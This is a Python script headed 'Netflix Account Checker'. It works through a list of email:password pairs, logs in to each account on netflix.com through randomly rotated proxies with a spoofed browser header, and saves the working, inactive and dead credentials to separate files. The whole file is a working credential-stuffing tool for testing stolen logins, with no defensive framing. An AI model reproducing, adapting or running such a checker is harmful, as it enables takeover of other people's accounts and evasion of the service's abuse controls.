#!/usr/bin/python

from __future__ import division
from progressbar import ProgressBar
from  mechanize import Browser
from os import path
from random import randint
from time import sleep

working=[]
dead=[]
notActive=[]
br = Browser()

def testAccount(email,password,typeProxy):
            global currentProxy
            global br

            logoutURL = 'https://www.netflix.com/SignOut?lnkctr=mL'
            page = 'Sorry, we are unable to process your request.'
            while (page.find('Sorry, we are unable to process your request.') != -1):
                try:
                    proxies("Default")
                    loginURL = 'https://www.netflix.com/login'
                    br.set_handle_equiv(True)
                    br.set_handle_redirect(True)
                    br.set_handle_referer(True)
                    br.set_handle_robots(False)
                    br.addheaders = [('User-agent', 'Firefox')]
                    if (currentProxy != ''):
                        if (typeProxy != 'HTTP'):
                            br.set_proxies({"socks5": currentProxy})
                        else:
                            br.set_proxies({"HTTP": currentProxy})
                    else:
                        br.set_proxies()
                    br.open(loginURL)
                    br.select_form(nr=0)
                    br.form['userLoginId'] = email
                    br.form['password'] = password
                    response = br.submit()
             
                    if (response.code == 200):
                        page = response.read().decode()
                        if (page.find('Sorry, we are unable to process your request.') != -1):
                            pass
                        elif (response.geturl().find('browse') != -1):
                            br.open(logoutURL)
                            working.append(email+':'+password+'\n')
                        elif (page.find('Finish Sign-up') != -1):
                            br.open(logoutURL)
                            notActive.append(email+':'+password)
                        elif (response.geturl().find('getstarted') != -1):
                            br.open(logoutURL)
                            notActive.append(email+':'+password)
                        elif (response.code == 500):
                            errorFile = open('error.txt', 'a+')
                            errorFile.write('500-Bad Gateway: currentProxy')
                            errorFile.close()
                        elif (page.find('Incorrect password') != -1):
                            dead.append(email+':'+password)
                        elif (page.find('find an account with this email address.') != -1):
                            dead.append(email+':'+password)
                        else:
                            print('Unknown Error. (7)')
                            errorFile = open('error.txt', 'a+')
                            errorFile.write(response.geturl()+'\n'+page)
                            errorFile.close()
                    else:
                        print('Error: '+str(response.code)+' Trying again.')
                except Exception as errorMsg:
                    print (response.geturl().find('getstarted'))
                    errorFile = open('error.txt', 'a+')
                    errorFile.write(response.geturl()+'\n'+page)
                    errorFile.close()    
                    br.open(logoutURL)
                    sleep(3)

def writeToFile():
    global working
    global dead
    global notActive

    workingAccounts = open('workingAccounts.txt', 'w+')
    deadAccounts = open('deadAccounts.txt', 'w+')
    nonActiveFile = open('notActive.txt', 'w+')
    for all in working:
        workingAccounts.write(all)
    for all in dead:
        deadAccounts.write(all)
    for all in notActive:
        nonActiveFile.write(all)
    workingAccounts.close()
    deadAccounts.close()
    nonActiveFile.close()
    print ('')
    print ('Summary:')
    print ('--------')
    print ('')
    print ('Working accounts: ' + str(len(working)))
    print ('Inactive Accounts: '+ str(len(notActive)))
    print ('Dead accounts: ' + str(len(dead)))
    print ('')

def proxies(country):
    global currentProxy
    proxyFile = "proxy-Default.txt"
    if (path.exists(proxyFile) and path.getsize(proxyFile) > 0):
        lines = open(proxyFile, "r")
        filestream = open(proxyFile, "r")
        randomProxyID = randint(0,sum(1 for row in lines) - 1)
        for proxyID, proxy in enumerate(filestream):
            if (proxyID == randomProxyID):
                currentProxy = proxy
                break
        filestream.close()
    else:
        currentProxy = ''

def main():   
    global debug
    global working
    global dead

    print('')
    print ('########################################################')
    print ('####             Netflix Account Checker            ####')
    print ('####              Coded by Abdes Salam              ####')
    print ('####                                                ####')
    print ('####                 DZ FAMILY TECH                 ####')
    print ('########################################################')
    print ('')

    try:
        accounts = 'checkAccounts.txt'
        if (path.exists(accounts) and path.getsize(accounts) > 0):
            progress = 0
            maxValue = sum(1 for acc in open(accounts))
            pbar = ProgressBar(maxval=maxValue).start()
            with open(accounts, "r") as filestream: 
                for line in filestream:
                    pbar.update(progress)
                    progress += 1
                    accountArgument = line.split(':')
                    args = len(accountArgument)
                    if (args == 3 or args == 2):
                        email = accountArgument[0]
                        password = accountArgument[1]
                        testAccount(email,password,'HTTP')
                    else:
                        print('Account List is not formatted properly.')
            
            pbar.finish()
            writeToFile()
        else:
            print('Accounts file is empty!')
            print('')
    except Exception as errorMsg:
        print('')
        print(errorMsg)
        print('An error occurred.. Saving progress...')
        print('')
        writeToFile()

if __name__ == "__main__":
  main()
